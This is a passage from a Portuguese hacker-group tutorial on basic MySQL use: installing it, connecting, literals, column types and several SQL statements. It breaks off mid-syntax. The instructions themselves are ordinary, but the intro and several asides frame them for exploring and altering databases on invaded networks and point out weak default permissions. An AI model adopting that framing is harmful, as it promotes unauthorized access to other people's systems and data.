@@ -1,0 +1,2194 @@
+##############################################################################
+############################# UNEKURITY TEAM #################################
+##############################################################################
+
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Este e outros tutoriais podem ser obtidos em:
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+
+OBSERVACAO: Todas as informacoes e exemplos contidos nesse tutorial possuem
+	    somente propositos educacionais.Nao nos responsabilizamos pelo
+	    mau uso do mesmo.
+
+Longe de ensinar passo a passo tudo sobre MySQL, irei aqui somente descrever
+coisas basicas, voltadas ao pessoal Newbie Fucador.Alguns esquemas simples,
+de modo que nao entrarei fundo em nada, muito menos na criacao de data
+bases e etc.Se voce eh experiente, se considera 'elite' ou estah atras de 
+algo complexo, nao perca seu tempo lendo este simples tutorial.
+
+
+		   **********************************
+	          *     TUTORIAL BASICO DE MySQL     *
+		   **********************************
+
+
+---------------------------------INDICE------------------------------------
+
+1 - INTRODUCAO.
+    1.1 - Termos Usados.
+2 - O QUE EH O MySQL.
+3 - BAIXANDO, INSTALANDO E EXECUTANDO SERVIDOR.
+4 - OPERACOES BASICAS.
+    4.1 Conectando e Disconectando
+    4.2 A Linguagem do MySQL
+        4.2.1 - Escrevendo Strings e Numeros
+        4.2.2 - Variaveis
+        4.2.3 - Tipos de Colunas
+        4.2.4 - Algumas Instrucoes MySQL e Suas Sintaxes
+    4.3 Enviando Queries
+    4.4 Exemplos de Queries Comuns
+5 - ADMINISTRACAO BASICA
+    5.1 Controle de Acesso
+    5.2 Setando Privilegios
+6 - TERMINANDO.
+    6.1 - Links e Referencias.
+    6.2 - Consideracoes Finais.
+
+------------------------------------------------------------------------------
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+Muitos fucadores iniciantes se veem as vezes num tedio generalizado.Se dao
+ao luxo de afirmarem:"Nao tem nada para fazer nas redes invadidas".Sem
+duvida que isto eh muito comum, haja visto, o pessoal mais inexperiente
+tem mais dificuldade em achar informacoes de nivel que poderiam ser boas
+no intuito de agucar a curiosidade do mesmo em busca de mais informacoes e
+dominio sobre os sistemas.Uma das coisas mais importantes que uma rede de
+medio ou grande porte pode conter sao os bancos de dados.Esses bancos de dados
+em sua maioria sao verdadeiros canivetes suicos, onde neles pode-se achar
+desde informacoes pessoais dos usuarios e clientes, ateh mesmo dados sigilosos
+e projetos "secretos".Um fucador mais experiente nao se contenta somente com
+o acesso ao Sistema Operacional em sih, ele busca acima de tudo encontrar 
+informacoes que possam de alguma forma abrangir mais seus conhecimentos.
+Eh nesse intuito que os banco de dados podem servir de beneficio,a ideia 
+nao eh bisbilhotar dados pessoais dos usuarios do sistema, longe disso, e sim 
+avancar mais no dominio e conhecimento da rede invadida.Durante muito 
+tempo(hoje ainda eh), os banco de dados eram aplicacoes "independentes",
+cada empresa procurava bons programadores para construirem um banco de dados
+proprio(exclusivo, as vezes), bancos de dados esses que supriam as necessidades
+das empresas.Com o passar dos anos, foi contemplado um esquema mais pratico
+que pudesse interagir bancos de dados de sistemas diferentes, melhor dizendo,
+um esquema onde pudesse haver portabilidade e praticidade.Foi aih que surgiu
+os "fazedores de banco de dados", e suas respectivas linguagens.Como tudo
+vinha caminhando para uma globalizacao(hj jah eh fato), os banco de dados
+se 'universalizaram'.Hoje existem varios programas capazes de criarem
+banco de dados, mas a realidade eh que nossos avos sabiam fazer a coisa
+certa, a eficiencia e a seguranca desses "fazedores" atuais tem sido
+questionada e tem se mostrado ineficaz.A propria velocidade de consulta
+pelos mesmos eh um problema ainda nao sanado.De qualquer forma, eles
+existem, e um fucador muitas vezes se depara com um, e se eles estao lah
+eh porque precisam ser "explorados".Existem varios 'fazedores', dentre eles
+se destacam o Oracle, o MySQL, o mSQL, o M$ SQL (shit!!), e etc...Irei
+descrever nesse tutorial inicial, alguns esquemas basicos para MySQL.Pelo
+que tenho lido, visto e notado, esse BD tem crescido vertiginosamente, em
+especial em sistemas Linux, de modo que, estah na hora de descrevermos
+mais material sobre ele em portugues.Os esquemas aqui serao simples, de
+modo que os pre-requisitos sao: conhecer o basico de Linux e tambem um
+conhecimento basico de algoritmos e de C, pois pretendo ensinar como 
+trabalhar com a linguagem em sih, um conhecimento basico de Ingles tambem
+se faz necessario, nesse mundo fucador, mano, as vezes o cara tem que 
+traduzir ateh texto alemao! Pegue um dicionario(de mao eh melhor) e
+comece a ralar caso tenha duvidas.
+
+1.1 - Termos Usados
+--------------------
+
+Vou descrever aqui alguns termos que irei usar no decorrer do tutorial
+para que nao haja duvidas, e para facilitar o entendimento daqueles que
+jah leram alguns tutoriais Internet a fora:
+
+Database  -> Banco de dados.Se refere ao banco de dados criado pela
+	     aplicacao MySQL.Esses databases se encontram geralmente no
+	     diretorio "PATH/data".Onde PATH eh o diretorio onde se
+	     localiza o mysql.
+
+Colums     -> Sao as colunas, vou me referir aqui como coluna mesmo.
+
+Table      -> Sao as tabelas, tambem irei "aportuguesar" esse termo.
+
+Index      -> Eh o indexador.
+
+floating point -> Programadores em C sabem muito bem, eh o ponto
+		  flutuante.
+
+unsigned -> Sem sinal.
+
+signed -> Com sinal.
+
+lenght -> Comprimento.
+
+---------------------
+2 - O QUE EH O MySQL |
+---------------------
+
+MySQL eh um servidor de banco de dados.Ele atua em cima de SQL(Structured
+Query Language) que eh a mais popular e padronizada  linguagem de banco 
+de dados do mundo(taih a sua importancia).MySQL eh uma ferramenta composta
+por servidor e cliente que consiste de um servidor daemon(mysqld) e muitos
+diferentes programas clientes e bibliotecas(libraries).
+
+SQL eh uma linguagem padronizada que facilita o armazenamento, atualizacao
+e o acesso a informacao(Banco de dados).Nesse tutorial chamarei a
+linguagem usada de linguagem MySQL, pois assim como o TURBO C eh diferente
+em sistemas, essa linguagem(SQL) tambem possui suas diferencas.
+
+Para um fucador, talvez seja de suma importancia o conhecimento de todos
+os servidores de banco de dados que puder obter.Sei que isto parece um
+tanto utopico, mas o basico sobre eles nao eh dificil.MySQL talvez seja o
+mais facil, por isso, como ponta peh inicial, iremos ver coisas basicas
+sobre ele.Talvez num futuro proximo algum membro do Unsekurity Team
+disponibilizarah algo sobre os demais BDs.
+
+-----------------------------------------------
+3 - BAIXANDO, INSTALANDO E EXECUTANDO SERVIDOR |
+-----------------------------------------------
+
+Bom,amigo, se voce tiver acesso a redes mundo a fora que contem MySQL
+nelas, voce pode pular este item.Mas se voce nao tiver, nao se preocupe,
+voce pode testar em sua maquina em casa.Lembrando que todos os esquemas
+aqui sao para Linux,diga-se Linux Slackware.Os esquemas aqui nesse item,
+talvez nao sirvam em outras plataformas.
+Antes de mais nada se faz necessario baixar os programas.Existem varios
+metodos de instalacao, dentre os quais voce pode optar em baixar o source
+para compilar em sua maquina, ou baixar os binarios.Se voce optar por
+baixar o source, preste bem atencao aos arquivos de instrucao de
+instalacao e siga os passos descritos nesses arquivos.Se voce optar pelos 
+binarios(eu optei por eles, as novas versoes nao compilam, muitos problemas 
+in my ShitWare), bastarah para voce descompactar o arquivo.Os enderecos para 
+baixar os mesmos podem ser encontrados em: http://www.mysql.com/ ; 
+lah existem varios links para tutoriais e informacoes sobre MySQL.
+
+Abaixo seguem os passos para se instalar uma versao binaria:
+
+# tar zvpvf mysql-3.22.32.tar.gz
+# ln -s mysql-3.22.32-pc-linux-gnu-i686 mysql
+# cd mysql
+# scripts/mysql_install_db
+
+Para executar o servidor:
+
+# bin/safe_mysqld &
+
+Muito pratico, nao? Eh preferivel instalar via source.As versoes binarias
+de qualquer programa devem ser vistas com cautela.Torna-se mais dificil a
+percepcao de erros e problemas usando versoes binarias, e a possibilidade 
+de instalacao de backdoor nas mesmas eh bem maior, que digam os programas
+para plataformas de codigo-fonte fechado(Windows,SunOS e etc)!
+
+Uma vez feito tudo isto voce poderah notar algumas coisas.Digite ps aux e
+netstat -na.Poderah ver os processos rodando e a porta tcp 3306 aberta
+esperando(LISTEN) conexao.Isso eh importante, pois quando acessar uma rede
+externa, poderah atraves desses "vestigios" reconhecer que o sistema estah
+executando MySQL.
+
+----------------------
+4 - OPERACOES BASICAS |
+----------------------
+
+Essa parte destina-se somente a descrever algumas operacoes basica de
+administracao.O que interessa primeiro para um fucador quase sempre eh
+obter "root" no sistema.Em banco de dados conhecer um pouco das possiveis
+operacoes com o servidor daemon eh uma boa, pois voce poderah com o tempo
+e pratica, alterar facilmente 'banco de dados' de terceiros e as proprias
+configuracoes do daemon.
+
+O sistema uma vez instalado pede para o admin configurar logo sua senha.
+Para isso basta voce seguir um dos passos abaixo:
+
+[localhost: /mysql]# ./bin/mysql -u root -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 10 to server version: 3.22.32
+
+Type 'help' for help.
+
+mysql>
+
+Voce digita seu passwd inicial quando ele pedir.Vode pode tambem atraves
+da linha de comando enviar diretamente o passwd.Ex:
+
+[localhost: /mysql]# ./bin/mysql -u root -pminhasenha
+
+No caso acima minhasenha eh o passwd.Cuidado com isto, pois pode ser
+facilmente 'capturado', pois encontra-se em modo limpo.Um outro programa
+usado para "conexoes" eh o mysqladmin, com ele voce pode fazer varias
+operacoes no servidor.Sua sintaxe eh a seguinte:
+
+Usage: ./mysqladmin [OPTIONS] command command....
+
+Digite ./mysqladmin --help | more para conferir mais sobre seu uso.Um
+exemplo basico de seu uso seria:
+
+[localhost: /mysql]# ./mysqladmin -u root -pminhasenha processlist
++----+------+-----------+----+---------+------+-------+------------------+
+| Id | User | Host      | db | Command | Time | State | Info             |
++----+------+-----------+----+---------+------+-------+------------------+
+| 11 | root | localhost |    | Sleep   | 447  |       |                  |
+| 14 | root | localhost |    | Query   | 0    |       | show processlist |
++----+------+-----------+----+---------+------+-------+------------------+
+
+Pelo visto acima, meu bd nao tah executando muita coisa, mas vamos
+trabalhar.As opcoes padroes sao lidas de um arquivo /etc/my.cnf, para
+todos, e ~/.my.cnf para opcoes especificas de um usuario do sistema.
+Use comandos simples de inicio, como status, ping, version, refresh, etc.
+O comando "shutdown" serve para derrubarmos, ou melhor, terminarmos a
+execucao do daemon.Isso eh mais pratico do que sair dando kill PID por aih.
+Uma vez o daemon derrubado, necessita ser novamente carregado via 
+comando" bin/safe_mysqld & ".
+
+Se o sistema estiver com configuracao padrao, qualquer um usuario do
+sistema pode se conectar ao mesmo(Atencao Fucadores!).Para isso basta
+digitar:
+
+[localhost: /mysql]$ bin/mysql
+
+Voce poder ver o user digitando no prompt do MySQL "status", veja:
+
+mysql> status
+--------------
+./mysql  Ver 9.38 Distrib 3.22.32, for pc-linux-gnu (i686)
+
+Connection id:          3
+Current database:
+Current user:           nashleon@localhost
+Server version          3.22.32
+Protocol version        10
+Connection              Localhost via UNIX socket
+UNIX socket             /tmp/mysql.sock
+Uptime:                 4 min 39 sec
+
+Threads: 2  Questions: 10  Slow queries: 0  Opens: 6  Flush tables: 1
+Open tables: 2
+--------------
+
+Como podemos notar o user em questao eh nashleon.Por default tambem, vale
+ressaltar uma coisa.Qualquer usuario do sistema pode executar o comando
+bin/mysqladmin podendo desse modo derrubar o servidor.Existem varias
+maneiras de se setar permissoes, tem alguns scripts no diretorio bin
+para isso, mas eu prefiro deixar como estah .:).Qualquer coisa, use chmod.
+O proprio tutorial que vem com o programa, descreve como se evitar isso.
+No item 5, Administracao Basica, eu descrevo mais algumas possiveis 
+operacoes basicas.Mas por enquato vamos ao que interessa de fato.
+
+4.1 - Conectando e Disconectando
+---------------------------------
+
+Para se conectar a um servidor geralmente necessitamos prover o nome de
+um usuario e respectivamente sua senha.Alguns parametros de conexao(host,
+username e passwd que serao usados) as vezes necessitam ser conhecidos e
+permitidos no servidor em que se quer conectar.Conhecendo esses parametros
+podemos acessar o servidor da seguinte maneira:
+
+[localhost: /mysql/bin]# ./mysql -h <host> -u <user> -p
+Enter password: ********
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 12 to server version: 3.22.32
+
+Type 'help' for help.
+
+mysql>
+
+Se der tudo certo, voce cairah nesse prompt acima, senao, algo deu errado:
+talvez voce nao tenha acesso ao host, ou a senha ou user estejam errados,
+veja a resposta dada pelo servidor.
+Note a primeira linha, ela avisa que o fim dos comandos deve conter ; ou
+\g.Isso serah importante mais a frente.
+
+Como vimos acima, algumas versoes permitem se conectar como "anonymous"
+para o servidor no host local.Se este for seu caso, para se conectar
+tudo que voce precisa fazer eh digitar "mysql", ou mesmo:
+
+[localhost: /mysql/bin]# ./mysql -h localhost -u "anonymous"
+
+Para se desconectar do daemon basta seguir um dos esquemas abaixo:
+
+mysql> quit
+Bye
+
+ou mesmo
+
+mysql> exit
+Bye
+
+Voce tambem pode se desconectar digitando control-D:
+
+mysql> Bye
+
+Aih estah.Nao existe muito segredo para se conectar e desconectar.
+
+4.2 A Linguagem do MySQL
+-------------------------
+
+O que descrevo aqui como linguagem do MySQL eh a linguagem em SQL usada
+pelo MySQL.A similaridade com C eh enorme, vou descrever processos basicos.
+Como disse no inicio, eh pre-requisito saber C, pois ajudarah muito no 
+entendimento de varios casos.
+
+4.2.1 - Escrevendo Strings e Numeros
+-------------------------------------
+
+A forma usada aqui eh parecida com a usada em C.Uma string em MySQL eh uma 
+sequencia de caracteres entre apostrofos(') ou aspas(").Exemplo:
+
+'hacker'
+"fucador"
+
+Os caracteres especiais assim como em C seguem parecidos.Exemplos:
+
+\0  -> Representa um caracter ASCII nulo.
+\n  -> Nova Linha.
+\t  -> Caracter tab.
+\r  -> Caracter de retorno.
+\b  -> Backspace.
+\'  -> Caracter apostrofo.
+\"  -> Aspas.
+\\  -> Essa barra invertida(\).
+\%  -> Porcentagem.Em MySQL ele eh usado para procurar por instancias
+       deste `%' no contexto onde '%' deve ser interpretado como um 
+       caracter wildcard.
+\_  -> Um caracter "_".Isto eh usado para procurar por instancias literais
+       de `_' no contexto onde `_' deve ser interpretado como um caracter
+       wildcard.
+
+Os numeros seguem o mesmo esquema seguido em C.Inteiros sao representados
+com uma sequencia de digitos, floats usam "." como separador decimal.
+Mysql suporta valores em hexadecimal.Exemplo:
+
+mysql> select 0x4e415348, 0x4c454f4e;
++------------+------------+
+| 0x4e415348 | 0x4c454f4e |
++------------+------------+
+| NASH       | LEON       |
++------------+------------+
+1 row in set (0.00 sec)
+
+
+No exemplo acima, vemos a conversao de sistemas: 4e = N, 41 = A, 53 = S,
+48 = H, MySQL pode ser usado para converter qualquer sistema numerico.
+Para ver valores dos caracteres em varios sistemas digite em
+seu linux "man ascii" e depois voce pode comparar com MySQL.
+
+
+4.2.2 - Nomes de banco de dados, tabela, index, coluna e alias 
+-----------------------------------------------------------------
+
+Esse item informarah a forma usada para declarar e se referir aos tipos
+citados no topico.Abaixo segue uma pequena tabela informando sobre os
+tipos possiveis de caracteres que podem conter um nome dos itens citados:
+
+
+ ----------------------------------------------------------------------
+|  Identificador  | Tamanho max. |       Caracteres permitidos	       |
+ ----------------------------------------------------------------------
+| Database        |      64      | Qualquer caracter que eh permitido  |
+|                 |		 | em um diretorio, exceto / e .       |
+ ----------------------------------------------------------------------
+| Table           |      64      | Qualquer caracter que eh permitido  |
+|		  |		 | no nome de um arquivo, exceto / e . |
+ ----------------------------------------------------------------------
+| Column          |      64      | Todos os caracteres		       |
+ ----------------------------------------------------------------------
+| Alias		  |     255      | Todos os caracteres		       |
+ ----------------------------------------------------------------------
+
+
+Note que se o identificador eh uma palavra restrita ou contem caracter 
+especial voce deve sempre escrever ele entre apostrofos quando usa-lo:
+
+SELECT * from `select` where `select`.id > 100;
+
+Em versoes antigas do MySQL as regras dos nomes sao as seguintes:
+
+* Um nome deve consistir de caracteres alfa-numericos do set de caracteres
+  atual(ISO-8859-1 Latin1, se o host alvo for de outro tipo, se liga aih),
+  e tambem os caracteres '_' e '$'.
+
+* Um nome deve comecar com algum caracter que eh legal no nome.Em
+  particular, um nome deve comecar com um numero.Todavia, um nome nao pode
+  consistir somente de numeros.
+
+* Voce nao pode usar o caracter ponto(.) nos nomes porque ele eh usado
+  para extender o formato que voce se refere para as colunas.
+
+Eh recomendado que voce nao use nomes como 1e, porque uma expressao como
+1e+1 eh ambigua(possui duplo sentido).Ela pode ser interpretada como a 
+expressao 1e + 1 ou como um numero 1e+1.
+
+Em MySQL voce pode se referir a uma coluna usando alguma das seguintes
+formas:
+
+ ---------------------------------------------------------------------
+|    Coluna                   | Referencia | Proposito ou Significado |
+ ---------------------------------------------------------------------
+|  col_name                   |  Coluna    | Nome da coluna  ao qual a|
+|			      |            | tabela em uso no query   |
+|			      |            | contem coluna com aquele |
+|			      |            | nome.		      |
+ ---------------------------------------------------------------------
+| tbl_name.col_name	      |  Coluna    | Nome da coluna da tabela |
+|			      |            | tbl_name da database     |
+|			      |            | atual.		      |
+ ---------------------------------------------------------------------
+| db_name.tbl_name.col_name   |  Coluna    | Nome da coluna da tabela |
+|			      |            | tbl_name da database     |
+|			      |            | dbname.		      |
+ ---------------------------------------------------------------------
+
+OBS: Vale ressaltar que a plataforma aonde voce se escontra eh quem manda
+     nos nomes dados as tabelas e databases.Se o seu SO(nosso caso Linux),
+     for case sensitive(diferencia letras maiusculas de minusculas),entao
+     a sintaxe deve obedecer essa regra.Nomes de colunas sao case sensitive
+     em todos os casos, Aliases nas tabelas e nas colunas tambem.Se voce
+     eh novo no mundo Unix e Linux, preste atencao nisso tudo!
+
+
+4.2.2 - Variaveis
+------------------
+
+MySQL suporta thread especifico de variaveis obedecendo a sintaxe 
+@nome_da_variavel.Um nome de uma variavel deve consistir de caracteres
+alfa-numericos(do set de caracteres atual) e tambem "_" ,"$" e ".".
+
+Variaveis nao precisam ser inicializadas.Elas contem NULL por padrao e
+podem armazenar um valor inteiro, real ou uma string.Todas as variaveis
+para uma thread sao automaticamente 'libertas'(esvaziadas) quando uma
+thread existe.
+
+Voce pode setar uma variavel com a sintaxe de SET;
+
+SET @variable= { integer expression | real expression | string expression}
+[,@variable= ...].
+
+Voce tambem pode setar uma variavel em uma expressao com o sintaxe 
+@variavel:=expr :
+
+Variaveis devem ser usadas onde expressoes sao permitidas.Note que isto
+nao estah atualmente contido num contexto onde um numero eh explicitamente
+requerido, assim como na condicao LIMIT de uma declaracao SELECT ou o
+numero IGNORE da condicao LINES da declaracao LOAD DATA.Veremos essas 
+instrucoes mais a frente, nao se aflinja!:)
+
+
+4.2.3 - Tipos de Colunas
+-------------------------
+
+MySQL suporta varios tipos de colunas que podem ser agrupadas em tres
+categorias: tipos numericos, tipos data e tempo, e tipos string
+(caracteres).Irei ser muito breve aqui, qualquer duvida, consulte os
+links em busca de mais material.
+Os tipos de colunas suportados pelo MySQL sao listados abaixo.As letras
+abaixo sao usadas em descricoes:
+
+M -> Indica o tamanho maximo de exibicao(display).O tamanho maximo
+     permitido eh 255.
+
+D -> Aplicado para tipos floating-point e indica o numero de digitos 
+     seguintes ao ponto decimal.O valor maximo possivel eh 30, mas nao
+     pode ser maior de M-2.
+
+Conchetes("[" e "]") indicam partes dos tipos especificados que sao
+opcionais.
+
+Note que se voce especificar ZEROFILL para uma coluna, MySQL irah 
+automaticamente adicionar o atributo UNSIGNED para a coluna.Vamos lah:
+
+4.2.3.1 - Tipos Numericos
+-------------------------
+
+TINYINT[(M)] [UNSIGNED] [ZEROFILL] -> Representa um inteiro muito pequeno.
+	Compreende tamanho de -128 ateh 127.A serie unsigned eh de 0 ateh
+	255.
+
+SMALLINT[(M)] [UNSIGNED] [ZEROFILL] -> Um pequeno inteiro.Compreende
+	tamanho de 32768 ateh 32767.A serie unsigned  eh de 0 ateh 65535.
+
+MEDIUMINT[(M)] [UNSIGNED] [ZEROFILL] -> Um inteiro de tamanho medio.
+	Compreende de -8388608 ateh 8388607.A serie unsigned eh de 0 ateh
+	16777215.
+
+INT[(M)] [UNSIGNED] [ZEROFILL] -> Um inteiro de tamanho normal.Compreende
+	de -2147483648 ateh 2147483647.A serie unsigned vai de 0 ateh
+	4294967295.
+
+INTEGER[(M)] [UNSIGNED] [ZEROFILL] -> Este eh equivalente a INT.
+
+BIGINT[(M)] [UNSIGNED] [ZEROFILL] -> Um inteiro largo(enorme).Compreende
+	de -9223372036854775808 ateh 9223372036854775807.A serie unsigned
+	eh de 0 ateh 18446744073709551615.Note que toda aritmetica eh
+	feita usando valores BIGINT ou DOUBLE com sinais, entao voce nao
+	deve usar unsigned big integers larger senao teriamos um numero
+	gigantesco(9223372036854775807 - 63 bits).Nao aconselho usar esse
+	tipo.
+
+FLOAT[(M,D)] [ZEROFILL] -> Um pequeno(precisao-singular) numero
+	floating-point.Nao pode ser unsigned.Permite valores entre
+	-3.402823466E+38 e -1.175494351E-38, 0 e 1.175494351E-38 ateh
+	3.402823466E+38.O M eh o tamanho da exibicao e D eh o numero de
+	casas decimais. FLOAT sem um argumento ou com um argumento <=24
+	permanece como um numero floating point de precisao singular.
+
+DOUBLE[(M,D)] [ZEROFILL] -> Um numero floating point de tamanho normal.
+	(dupla-precisao).Nao pode ser unsigned.Permite valores que vao de
+	-1.7976931348623157E+308 ateh -2.2250738585072014E-308, 0 e
+	2.2250738585072014E-308 ateh 1.7976931348623157E+308.DOUBLE sem
+	um argumento ou FLOAT(X) onde 25 <= X <= 53 permanece como um 
+	numero floating point de dupla-precisao.
+
+DOUBLE PRECISION[(M,D)] [ZEROFILL] -> Igual a DOUBLE.
+   
+
+REAL[(M,D)] [ZEROFILL] -> Igual a DOUBLE.
+
+DECIMAL[(M[,D])] [ZEROFILL] -> Um numero floating-point "unpacket".Nao
+	pode ser unsigned.Porta-se como uma coluna do tipo CHAR: unpacket
+	faz com que o numero seja amazenado como uma string, usando um
+	caracter para cada digito do valor dado.
+
+NUMERIC(M,D) [ZEROFILL] -> Igual a DECIMAL.
+
+
+4.2.3.1 - Tipos data e tempo
+-----------------------------
+
+DATE -> Uma data.A extensao suportada vai de '1000-01-01' ateh '9999-12-31'. 
+	MySQL mostra valores DATE no formato 'YYYY-MM-DD', mas permite que
+	voce declare valores para colunas DATE usando outras strings ou
+	numeros.
+
+DATETIME -> Uma combinacao de date e tempo(hora).A extensao suportada vai
+	de '1000-01-01 00:00:00' ateh '9999-12-31 23:59:59'.MySQL mostra
+	valores DATETIME em formato 'YYYY-MM-DD HH:MM:SS', mas assim como
+	DATE, ele permite a voce declarar valores para as colunas DATETIME
+	usando outras strings ou numeros.
+
+TIMESTAMP[(M)] -> eh um tipo de coluna que pode ser usado para marcar
+		  automaticamente operacoes INSERT ou UPDATE com a data
+		  e a hora atual.Se voce tem multiplas colunas TIMESTAMP,
+		  somente o a primeira eh automaticamente utualizada.
+
+TIME -> Resgata e mostra valores TIME em formato 'HH:MM:SS'(ou 'HHH:MM:SS').
+		
+YEAR -> O tipo YEAR eh um 1-byte usado para representar anos.MySQL pega e
+	mostra valores YEAR em formato YYYY, compreendidos entre 1901 ateh
+	2155.
+
+4.2.3.2 - Tipos String
+-----------------------
+
+Os tipos string sao CHAR, VARCHAR, BLOB, TEXT, ENUM e SET.
+
+CHAR e VARCHAR -> Sao similares, mas difirenciam no modo que armazenam e
+		  resgatam dados.
+		  O comprimento da coluna CHAR eh fixado pelo comprimento
+		  que voce declara quando voce cria a tabela.O comprimento
+		  pode variar entre 0 e 255.
+		  Valores em colunas VARCHAR sao strings de tamanho
+		  variavel.Voce pode declarar uma coluna VARCHAR com algum
+		  comprimento entre 1 e 255.
+		  O contraste entre CHAR e VARCHAR consiste que ao contrario
+		  de CHAR, valores VARCHAR sao armazenados usando somente os
+		  caracteres que sao necessarios(sem enchimento).
+
+BLOB e TEXT -> BLOB eh um large objeto binario que pode prender uma
+	       quantidade de dados.Os quatro tipos BLOB sao TINYBLOB,
+	       BLOB, MEDIUMBLOB e LONGBLOB e diferem somente no tamanho
+	       que eles podem agarrar.Assim como BLOB, TEXT tambem possui
+	       quatro tipos, sao eles: TINYTEXT, TEXT, MEDIUMTEXT e
+	       LONGTEXT.A unica diferenca entre BLOB e TEXT eh que BLOB eh
+	       case-sensitive, e TEXT nao.
+
+ENUM -> Eh uma string objeto do qual os valores sao normalmente escolhidos
+	de uma lista de valores permitidos que sao enumerados explicitamente 
+	em uma coluna especificada no momento da criacao da tabela.O valor
+	deve ser tambem a string vazia("") ou NULL sobre certas
+	circunstancias.Uma enumeracao pode ter no maximo 65535 elementos.
+
+SET -> Eh uma string objeto que pode ter zero ou mais valores.Cada uma dessas
+       strings pode ser escolhida de uma lista de valores permitidos
+       especificados quando a tabela eh criada.Valores da coluna SET que
+       consiste de multiplos 'membros set' sao especificados com os
+       membros separados por virgulas.Um SET pode ter no maximo 64
+       membros diferentes.MySQL armazena numericamente os valores de SET,
+       com o bit de ordem menor do valor armazenado correspondendo ao
+       primeiro membro do set.Se um numero eh armazenado sobre uma coluna
+       SET, os bits daquele set serao setados em representacao binaria do
+       numero que determina os membros de set no valor da coluna.Imagine
+       que uma coluna eh especificada como SET("a","b","c"."d").Os membros
+       possuem os seguintes valores:
+
+        --------------------------------------------------
+       | Membro do SET | Valor Decimal |   Valor Binario  |
+	--------------------------------------------------
+       |       a       |       1       |       0001       |
+        --------------------------------------------------
+       |       b       |       2       |       0010       |
+	--------------------------------------------------
+       |       c       |       4       |       0100       |
+	--------------------------------------------------
+       |       d       |       8       |       1000       |
+	--------------------------------------------------
+
+
+
+4.2.4 - Algumas Instrucoes MysSQL e Suas Sintaxes
+---------------------------------------------------
+
+Note que eu nao estou disponibilizando todas as informacoes sobre cada
+instrucao, apenas o basico, e estou adotando uma ordem que ao meu ver
+facilita a compreensao do mesmo, abaixo voce verah as instrucoes e a ordem
+delas que disponibilizo neste tutorial:
+
+Comentarios;
+SHOW;
+CREATE DATABASE;
+DROP DATABASE;
+USE;
+CREATE TABLE;
+ALTER TABLE;
+DROP TABLE;
+OPTIMIZE TABLE;
+SELECT;
+INSERT;
+REPLACE; 
+LOAD DATA INFILE;
+SET;
+UPDATE;
+FLUSH;
+KILL;
+EXPLAIN;
+DESCRIBE;
+CREATE INDEX;
+DROP INDEX;
+LOCK TABLES;
+UNLOCK TABLES;
+GRANT;
+REVOKE;
+
+* Comentarios -> Quando se quer fazer um comentario em MySQL, varios tipos
+--------------	 sao permitidos.MySQL suporta # para fim da linha(como
+		 shell script), -- para fim da linha, /* em muitas linhas
+		 */(como em C)
+
+
+* SHOW -> Comando usado para mostrar informacoes sobre tabelas, colunas e
+-------	  etc.Sua sintaxe segue abaixo:
+ 
+    SHOW DATABASES [LIKE wild]
+ou SHOW TABLES [FROM db_name] [LIKE wild]
+ou SHOW COLUMNS FROM tbl_name [FROM db_name] [LIKE wild]
+ou SHOW INDEX FROM tbl_name [FROM db_name]
+ou SHOW STATUS
+ou SHOW VARIABLES [LIKE wild]
+ou SHOW [FULL] PROCESSLIST
+ou SHOW TABLE STATUS [FROM db_name] [LIKE wild]
+ou SHOW GRANTS FOR user
+
+Exemplo:
+
+mysql> show databases;
++----------+
+| Database |
++----------+
+| korgan   |
+| mysql    |
+| precos   |
+| test     |
++----------+
+4 rows in set (0.00 sec)
+
+mysql> show tables from precos;
++------------------+
+| Tables in precos |
++------------------+
+| preco            |
+| preco2           |
++------------------+
+2 rows in set (0.00 sec)
+
+mysql> show columns from preco2 from precos;
++-----------------+--------------------------+------+-----+---------+-------+
+| Field           | Type                     | Null | Key | Default | Extra |
++-----------------+--------------------------+------+-----+---------+-------+
+| codigo          | int(3) unsigned zerofill |      | PRI | 000     |       |
+| banda           | char(15)                 |      | PRI |         |       |
+| preco           | double(16,2)             |      | PRI | 0.00    |       |
+| copias_vendidas | int(4) unsigned zerofill |      |     | 0000    |       |
++-----------------+--------------------------+------+-----+---------+-------+
+4 rows in set (0.13 sec)
+
+mysql>
+
+Aih estah alguns exemplos do uso de SHOW.Quando comecar a criar seus
+databases aih voce entenderah melhor toda a logica que envolve essa
+linguagem.
+
+* CREATE DATABASE -> Responsavel pela criacao das databases.Sua Sintaxe
+-----------------    segue abaixo:
+
+CREATE DATABASE db_name
+
+Onde esse db_name eh o nome do database que voce quer criar.Vejamos um
+exemplo:
+
+mysql> create database nl;
+Query OK, 1 row affected (0.04 sec)
+
+Depois voce pode usar show para ver sua database:
+
+mysql> show databases;
++----------+
+| Database |
++----------+
+| korgan   |
+| mysql    |
+| nl       |
+| precos   |
+| test     |
++----------+
+5 rows in set (0.00 sec)
+
+As databases sao diretorios que contem os arquivos que correspondem as
+tabelas do banco de dados.CREATE DATABASE na verdade soh cria um diretorio,
+uma vez que no inicio, nao tem nenhuma tabela.
+
+
+* DROP DATABASE -> Eh usado para apagar tabelas e databases(os diretorios
+---------------	   como um todo).Sua sintaxe eh a seguinte:
+
+DROP DATABASE [IF EXISTS] db_name
+
+Exemplo:
+
+mysql> drop database korgan;
+Query OK, 0 rows affected (0.06 sec)
+
+mysql> show databases;
++----------+
+| Database |
++----------+
+| mysql    |
+| nl       |
+| precos   |
+| test     |
++----------+
+4 rows in set (0.01 sec)
+
+Como voce pode notar, a database 'korgan' nao existe mais.Muito cuidado
+ao usar este arquivo, mano!
+
+* USE -> Eh usado para chamar um database.Ele irah avisar ao MySQL para
+------   tornar naquele momento o database que o usuario deseja, o
+	 database default para manipulacao de dados(queries).Sintaxe:
+
+USE db_name
+
+Onde db_name eh o nome do database, exemplo:
+
+mysql> use nl;
+Database changed
+mysql>
+
+Voce pode usar o comando USE para ficar alternando entre as databases,
+mais a frente, quando analisarmos bem SELECT, veremos como fazer isso.
+
+* CREATE TABLE -> Usado para criacao de tabelas.Ele cria uma tabela com
+--------------    um nome dado na atual database.Em MySQL 3.22 ou versoes
+		  superiores, o nome da tabela pode ser especificado como:
+		  db_name.tbl_name.Isto faz com que se trabalhe com uma
+		  tabela que nao faz parte da database atual.Sintaxe:
+
+CREATE [TEMPORARY] TABLE [IF NOT EXISTS] tbl_name [(create_definition,...)]
